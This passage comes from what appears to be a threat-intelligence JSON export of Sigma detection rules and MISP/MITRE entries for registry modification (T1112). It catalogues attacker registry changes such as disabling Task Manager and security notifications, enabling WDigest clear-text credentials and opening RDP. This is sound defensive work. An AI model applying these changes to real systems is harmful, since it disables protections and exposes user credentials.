                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: selection_service\n  selection_service:\n    EventID: 4698\n    TaskName:\n    - SC Scheduled Scan\n    - UpdatMachine\nfalsepositives:\n- Unknown\nid: c0580559-a6bd-4ef6-b9b7-83703d98b561\nlevel: critical\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/11/27\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nrelated:\n- id: 53ba33fd-3a50-4468-a5ef-c583635cfa92\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity - Security\n",
                            "sigma:id": "c0580559-a6bd-4ef6-b9b7-83703d98b561",
                            "title": "Chafer Activity - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2ff692c2-4594-41ec-8fcb-46587de769e0",
                        "lookup_data": {
                            "description": "Detects disabling the CrashDump per registry (as used by HermeticWiper)",
                            "raw": "author: Tobias Michalski (Nextron Systems)\ndate: 2022/02/24\ndescription: Detects disabling the CrashDump per registry (as used by HermeticWiper)\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|contains: SYSTEM\\CurrentControlSet\\Control\\CrashControl\nfalsepositives:\n- Legitimate disabling of crashdumps\nid: 2ff692c2-4594-41ec-8fcb-46587de769e0\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/08/23\nreferences:\n- https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/\nstatus: experimental\ntags:\n- attack.t1564\n- attack.t1112\ntitle: CrashControl CrashDump Disabled\n",
                            "sigma:id": "2ff692c2-4594-41ec-8fcb-46587de769e0",
                            "title": "CrashControl CrashDump Disabled",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                        "lookup_data": {
                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1663580963",
                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c3198a27-23a0-4c2c-af19-e5328d49680e",
                        "lookup_data": {
                            "description": "Attempts to detect system changes made by Blue Mockingbird",
                            "raw": "author: Trent Liffick (@tliffick)\ndate: 2020/05/14\ndescription: Attempts to detect system changes made by Blue Mockingbird\ndetection:\n  condition: sc_cmd or wmic_cmd\n  sc_cmd:\n    CommandLine|contains|all:\n    - sc config\n    - wercplsupporte.dll\n    Image|endswith: \\cmd.exe\n  wmic_cmd:\n    CommandLine|endswith: COR_PROFILER\n    Image|endswith: \\wmic.exe\nfalsepositives:\n- Unknown\nid: c3198a27-23a0-4c2c-af19-e5328d49680e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://redcanary.com/blog/blue-mockingbird-cryptominer/\nrelated:\n- id: ce239692-aa94-41b3-b32f-9cab259c96ea\n  type: merged\nstatus: test\ntags:\n- attack.execution\n- attack.t1112\n- attack.t1047\ntitle: Blue Mockingbird\n",
                            "sigma:id": "c3198a27-23a0-4c2c-af19-e5328d49680e",
                            "title": "Blue Mockingbird",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0c93308a-3f1b-40a9-b649-57ea1a1c1d63",
                        "lookup_data": {
                            "description": "Detect set Notification_Suppress to 1 to disable the windows security center notification",
                            "raw": "author: frack113\ndate: 2022/08/19\ndescription: Detect set Notification_Suppress to 1 to disable the windows security\n  center notification\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith: SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\\Notification_Suppress\nfalsepositives:\n- Unknown\nid: 0c93308a-3f1b-40a9-b649-57ea1a1c1d63\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Activate Suppression of Windows Security Center Notifications\n",
                            "sigma:id": "0c93308a-3f1b-40a9-b649-57ea1a1c1d63",
                            "title": "Activate Suppression of Windows Security Center Notifications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e2482f8d-3443-4237-b906-cc145d87a076",
                        "lookup_data": {
                            "description": "Detects registry modifications that change features of internal Windows tools (malware like Agent Tesla uses this technique)",
                            "raw": "author: frack113, Nasreddine Bencherchali\ndate: 2022/03/18\ndescription: Detects registry modifications that change features of internal Windows\n  tools (malware like Agent Tesla uses this technique)\ndetection:\n  condition: 1 of selection_set_*\n  selection_set_0:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|endswith:\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\shutdownwithoutlogon\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications\\ToastEnabled\n    - \\SYSTEM\\CurrentControlSet\\Control\\Storage\\Write Protection\n    - \\SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies\\WriteProtect\n  selection_set_1:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith:\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools\n    - SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskmgr\n    - SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer\\DisableNotificationCenter\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableChangePassword\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableLockWorkstation\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\StartMenuLogOff\nfalsepositives:\n- Legitimate admin script\nid: e2482f8d-3443-4237-b906-cc145d87a076\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/17\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md\n- https://www.mandiant.com/resources/unc2165-shifts-to-evade-sanctions\n- https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Disable Internal Tools or Feature in Registry\n",
                            "sigma:id": "e2482f8d-3443-4237-b906-cc145d87a076",
                            "title": "Disable Internal Tools or Feature in Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d6a9b252-c666-4de6-8806-5561bbbd3bdc",
                        "lookup_data": {
                            "description": "Detects potential malicious modification of the property value of UseLogonCredential from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to enable clear-text credentials",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2019/09/12\ndescription: Detects potential malicious modification of the property value of UseLogonCredential\n  from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to enable\n  clear-text credentials\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith: WDigest\\UseLogonCredential\nfalsepositives:\n- Unknown\nid: d6a9b252-c666-4de6-8806-5561bbbd3bdc\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html\n- https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Wdigest Enable UseLogonCredential\n",
                            "sigma:id": "d6a9b252-c666-4de6-8806-5561bbbd3bdc",
                            "title": "Wdigest Enable UseLogonCredential",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5ea0b0dc-45d0-4d5e-bed5-4271950d210f",
                        "lookup_data": {
                            "description": "Ursnif Campaign f1.pipen.at",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5ea0b0dc-45d0-4d5e-bed5-4271950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1592743551",
                            "uuid": "5ea0b0dc-45d0-4d5e-bed5-4271950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ed202147-4026-4330-b5bd-1e8dfa8cf7cc",
                        "lookup_data": {
                            "mitre-attack-id": "T1112",
                            "mitre-cti:description": "Misconfiguration of permissions in the Registry may lead to opportunities for an adversary to execute code, like through [Service Registry Permissions Weakness](https://attack.mitre.org/techniques/T1058). Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",
                            "mitre-cti:name": "Modify Registry Mitigation",
                            "mitre-cti:type": "course-of-action",
                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--ed202147-4026-4330-b5bd-1e8dfa8cf7cc', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'external_id': 'T1112', 'url': 'https://attack.mitre.org/mitigations/T1112', 'source_name': 'mitre-attack'}, {'source_name': 'Beechey 2010', 'description': 'Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014.', 'url': 'http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599'}, {'url': 'http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html', 'description': 'Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.', 'source_name': 'Windows Commands JPCERT'}, {'url': 'https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm', 'description': 'NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016.', 'source_name': 'NSA MS AppLocker'}, {'source_name': 'Corio 2008', 'description': 'Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014.', 'url': 'http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx'}, {'source_name': 'TechNet Applocker vs SRP', 'description': 'Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/ee791851.aspx'}], 'modified': '2020-01-17T16:45:23.884Z', 'name': 'Modify Registry Mitigation', 'description': 'Misconfiguration of permissions in the Registry may lead to opportunities for an adversary to execute code, like through [Service Registry Permissions Weakness](https://attack.mitre.org/techniques/T1058). Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.\\n\\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5a93eb65-dffa-4543-b761-94aa60098fb6",
                        "lookup_data": {
                            "description": "Detects registry modifications that hide internal tools or functions from the user (malware like Agent Tesla, Hermetic Wiper uses this technique)",
                            "raw": "author: frack113\ndate: 2022/03/18\ndescription: Detects registry modifications that hide internal tools or functions\n  from the user (malware like Agent Tesla, Hermetic Wiper uses this technique)\ndetection:\n  condition: 1 of selection_set_*\n  selection_set_0:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|endswith:\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowInfoTip\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowCompColor\n  selection_set_1:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith:\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\HideClock\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\HideSCAHealth\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\HideSCANetwork\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\HideSCAPower\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\HideSCAVolume\nfalsepositives:\n- Legitimate admin script\nid: 5a93eb65-dffa-4543-b761-94aa60098fb6\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.001/T1564.001.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Registry Hide Function from User\n",
                            "sigma:id": "5a93eb65-dffa-4543-b761-94aa60098fb6",
                            "title": "Registry Hide Function from User",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5118765f-6657-4ddb-a487-d7bd673abbf1",
                        "lookup_data": {
                            "description": "Detects FlowCloud malware from threat group TA410.",
                            "raw": "author: NVISO\ndate: 2020/06/09\ndescription: Detects FlowCloud malware from threat group TA410.\ndetection:\n  condition: selection\n  selection:\n  - TargetObject:\n    - HKLM\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}\n    - HKLM\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}\n    - HKLM\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}\n  - TargetObject|startswith: HKLM\\SYSTEM\\Setup\\PrintResponsor\\\nfalsepositives:\n- Unknown\nid: 5118765f-6657-4ddb-a487-d7bd673abbf1\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new\nstatus: test\ntags:\n- attack.persistence\n- attack.t1112\ntitle: FlowCloud Malware\n",
                            "sigma:id": "5118765f-6657-4ddb-a487-d7bd673abbf1",
                            "title": "FlowCloud Malware",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1c3121ed-041b-4d97-a075-07f54f20fb4a",
                        "lookup_data": {
                            "description": "Detects registry modifications that disable internal tools or functions in explorer (malware like Agent Tesla uses this technique)",
                            "raw": "author: frack113\ndate: 2022/03/18\ndescription: Detects registry modifications that disable internal tools or functions\n  in explorer (malware like Agent Tesla uses this technique)\ndetection:\n  condition: selection_set_1\n  selection_set_1:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith:\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoLogOff\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDesktop\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFind\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFileMenu\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSetTaskbar\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoPropertiesMyDocuments\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoTrayContextMenu\nfalsepositives:\n- Legitimate admin script\nid: 1c3121ed-041b-4d97-a075-07f54f20fb4a\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Registry Explorer Policy Modification\n",
                            "sigma:id": "1c3121ed-041b-4d97-a075-07f54f20fb4a",
                            "title": "Registry Explorer Policy Modification",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b7b19cb6-9b32-4fc4-a108-73f19acfe262",
                        "lookup_data": {
                            "description": "Detect VBoxDrvInst.exe run with parameters allowing processing INF file.\nThis allows to create values in the registry and install drivers.\nFor example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys\n",
                            "raw": "author: Konstantin Grishchenko, oscd.community\ndate: 2020/10/06\ndescription: 'Detect VBoxDrvInst.exe run with parameters allowing processing INF file.\n\n  This allows to create values in the registry and install drivers.\n\n  For example one could use this technique to obtain persistence via modifying one\n  of Run or RunOnce registry keys\n\n  '\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - driver\n    - executeinf\n    Image|endswith: \\VBoxDrvInst.exe\nfalsepositives:\n- Legitimate use of VBoxDrvInst.exe utility by VirtualBox Guest Additions installation\n  process\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: b7b19cb6-9b32-4fc4-a108-73f19acfe262\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OtherBinaries/VBoxDrvInst.yml\n- https://twitter.com/pabraeken/status/993497996179492864\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Suspicious VBoxDrvInst.exe Parameters\n",
                            "sigma:id": "b7b19cb6-9b32-4fc4-a108-73f19acfe262",
                            "title": "Suspicious VBoxDrvInst.exe Parameters",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
                        "lookup_data": {
                            "description": "Detects registry changes to Office macro settings. The TrustRecords contain information on executed macro-enabled documents. (see references)",
                            "raw": "author: Trent Liffick (@tliffick)\ndate: 2020/05/22\ndescription: Detects registry changes to Office macro settings. The TrustRecords contain\n  information on executed macro-enabled documents. (see references)\ndetection:\n  condition: selection\n  selection:\n    EventType: Setvalue\n    TargetObject|endswith:\n    - \\Security\\Trusted Documents\\TrustRecords\n    - \\Security\\AccessVBOM\n    - \\Security\\VBAWarnings\nfalsepositives:\n- Valid Macros and/or internal documents\nid: a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/06/26\nreferences:\n- https://twitter.com/inversecos/status/1494174785621819397\n- https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/\n- https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Office Security Settings Changed\n",
                            "sigma:id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
                            "title": "Office Security Settings Changed",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "28036918-04d3-423d-91c0-55ecf99fb892",
                        "lookup_data": {
                            "description": "Detects changes to the NGenAssemblyUsageLog registry key.\n.NET Usage Log output location can be controlled by setting the NGenAssemblyUsageLog CLR configuration knob in the Registry or by configuring an environment variable (as described in the next section).\nBy simplify specifying an arbitrary value (e.g. fake output location or junk data) for the expected value, a Usage Log file for the .NET execution context will not be created.\n",
                            "raw": "author: frack113\ndate: 2022/11/18\ndescription: 'Detects changes to the NGenAssemblyUsageLog registry key.\n\n  .NET Usage Log output location can be controlled by setting the NGenAssemblyUsageLog\n  CLR configuration knob in the Registry or by configuring an environment variable\n  (as described in the next section).\n\n  By simplify specifying an arbitrary value (e.g. fake output location or junk data)\n  for the expected value, a Usage Log file for the .NET execution context will not\n  be created.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    EventType: SetValue\n    TargetObject|endswith: SOFTWARE\\Microsoft\\.NETFramework\\NGenAssemblyUsageLog\nfalsepositives:\n- Unknown\nid: 28036918-04d3-423d-91c0-55ecf99fb892\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: NET NGenAssemblyUsageLog Registry Key Tamper\n",
                            "sigma:id": "28036918-04d3-423d-91c0-55ecf99fb892",
                            "title": "NET NGenAssemblyUsageLog Registry Key Tamper",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3ae1a046-f7db-439d-b7ce-b8b366b81fa6",
                        "lookup_data": {
                            "description": "Detect set UseActionCenterExperience to 0 to disable the windows security center notification",
                            "raw": "author: frack113\ndate: 2022/08/19\ndescription: Detect set UseActionCenterExperience to 0 to disable the windows security\n  center notification\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|endswith: Windows\\CurrentVersion\\ImmersiveShell\\UseActionCenterExperience\nfalsepositives:\n- Unknown\nid: 3ae1a046-f7db-439d-b7ce-b8b366b81fa6\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Disable Windows Security Center Notifications\n",
                            "sigma:id": "3ae1a046-f7db-439d-b7ce-b8b366b81fa6",
                            "title": "Disable Windows Security Center Notifications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a07f0359-4c90-4dc4-a681-8ffea40b4f47",
                        "lookup_data": {
                            "description": "Detect the creation of a service with a service binary located in a suspicious directory",
                            "raw": "author: Florian Roth (Nextron Systems), frack113\ndate: 2022/05/02\ndescription: Detect the creation of a service with a service binary located in a suspicious\n  directory\ndetection:\n  condition: 1 of selection_* and not 1 of filter_*\n  filter_1:\n    Image|contains|all:\n    - \\Common Files\\\n    - \\Temp\\\n  selection_1:\n    Details:\n    - DWORD (0x00000000)\n    - DWORD (0x00000001)\n    - DWORD (0x00000002)\n    EventType: SetValue\n    Image|contains:\n    - \\Users\\Public\\\n    - \\Perflogs\\\n    - \\ADMIN$\\\n    - \\Temp\\\n    TargetObject|endswith: \\Start\n    TargetObject|startswith: HKLM\\System\\CurrentControlSet\\Services\\\n  selection_2:\n    Details|contains:\n    - \\Users\\Public\\\n    - \\Perflogs\\\n    - \\ADMIN$\\\n    - \\Temp\\\n    EventType: SetValue\n    TargetObject|endswith: \\ImagePath\n    TargetObject|startswith: HKLM\\System\\CurrentControlSet\\Services\\\nfalsepositives:\n- Unknown\nid: a07f0359-4c90-4dc4-a681-8ffea40b4f47\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nrelated:\n- id: c0abc838-36b0-47c9-b3b3-a90c39455382\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Service Binary in Suspicious Folder\n",
                            "sigma:id": "a07f0359-4c90-4dc4-a681-8ffea40b4f47",
                            "title": "Service Binary in Suspicious Folder",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "41904ebe-d56c-4904-b9ad-7a77bdf154b3",
                        "lookup_data": {
                            "description": "Detects potential malicious modification of the property value of fDenyTSConnections and UserAuthentication to enable remote desktop connections.",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/09/12\ndescription: Detects potential malicious modification of the property value of fDenyTSConnections\n  and UserAuthentication to enable remote desktop connections.\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    TargetObject|endswith:\n    - \\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\UserAuthentication\n    - \\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- Image\n- EventType\n- TargetObject\nid: 41904ebe-d56c-4904-b9ad-7a77bdf154b3\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2019/11/10\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190407183310.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: RDP Registry Modification\n",
                            "sigma:id": "41904ebe-d56c-4904-b9ad-7a77bdf154b3",
                            "title": "RDP Registry Modification",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0b80ade5-6997-4b1d-99a1-71701778ea61",
                        "lookup_data": {
                            "description": "Detects the import of a alternate datastream to the registry with regedit.exe.",
                            "raw": "author: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020/10/12\ndescription: Detects the import of a alternate datastream to the registry with regedit.exe.\ndetection:\n  condition: all of selection* and not filter\n  filter:\n    CommandLine|contains:\n    - ' /e '\n    - ' /a '\n    - ' /c '\n    - ' -e '\n    - ' -a '\n    - ' -c '\n  selection:\n    CommandLine|contains:\n    - ' /i '\n    - .reg\n    Image|endswith: \\regedit.exe\n  selection_2:\n    CommandLine|re: :[^ \\\\]\nfalsepositives:\n- Unknown\nfields:\n- ParentImage\n- CommandLine\nid: 0b80ade5-6997-4b1d-99a1-71701778ea61\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/12/31\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nrelated:\n- id: 73bba97f-a82d-42ce-b315-9182e76c57b1\n  type: similar\nstatus: test\ntags:\n- attack.t1112\n- attack.defense_evasion\ntitle: Imports Registry Key From an ADS\n",
                            "sigma:id": "0b80ade5-6997-4b1d-99a1-71701778ea61",
                            "title": "Imports Registry Key From an ADS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "62e0298b-e994-4189-bc87-bc699aa62d97",
                        "lookup_data": {
                            "description": "Detects the import of the '.reg' files from suspicious paths using the 'reg.exe' utility",
                            "raw": "author: frack113, Nasreddine Bencherchali\ndate: 2022/08/01\ndescription: Detects the import of the '.reg' files from suspicious paths using the\n  'reg.exe' utility\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains: ' import '\n  selection_img:\n  - Image|endswith: \\reg.exe\n  - OriginalFileName: reg.exe\n  selection_paths:\n    CommandLine|contains:\n    - C:\\Users\\\n    - '%temp%'\n    - '%tmp%'\n    - '%appdata%'\n    - \\AppData\\Local\\Temp\\\n    - C:\\Windows\\Temp\\\n    - C:\\ProgramData\\\nfalsepositives:\n- Legitimate import of keys\nid: 62e0298b-e994-4189-bc87-bc699aa62d97\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-import\nrelated:\n- id: 73bba97f-a82d-42ce-b315-9182e76c57b1\n  type: derived\nstatus: experimental\ntags:\n- attack.t1112\n- attack.defense_evasion\ntitle: Imports Registry Key From a File Using Reg.exe\n",
                            "sigma:id": "62e0298b-e994-4189-bc87-bc699aa62d97",
                            "title": "Imports Registry Key From a File Using Reg.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8f02c935-effe-45b3-8fc9-ef8696a9e41d",
                        "lookup_data": {
                            "description": "Search for usage of reg or Powershell by non-privileged users to modify service configuration in registry",
